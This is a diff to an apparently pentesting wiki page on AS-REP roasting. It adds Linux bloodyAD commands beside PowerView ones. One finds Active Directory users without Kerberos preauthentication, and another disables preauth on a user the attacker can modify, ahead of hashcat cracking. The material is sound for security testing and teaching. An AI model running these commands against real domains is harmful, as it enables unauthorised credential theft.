@@ -39,9 +39,17 @@ Furthermore, **no domain account is needed to perform this attack**, only connec
 
 #### Enumerating vulnerable users (need domain credentials)
 
+{% code title="Using Windows" %}
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
+{% endcode %}
+
+{% code title="Using Linux" %}
+```bash
+bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
+```
+{% endcode %}
 
 #### Request AS\_REP message
 
@@ -76,9 +84,17 @@ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 
 Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
 
+{% code title="Using Windows" %}
 ```bash
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
+{% endcode %}
+
+{% code title="Using Linux" %}
+```bash
+bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
+```
+{% endcode %}
 
 ## References
 
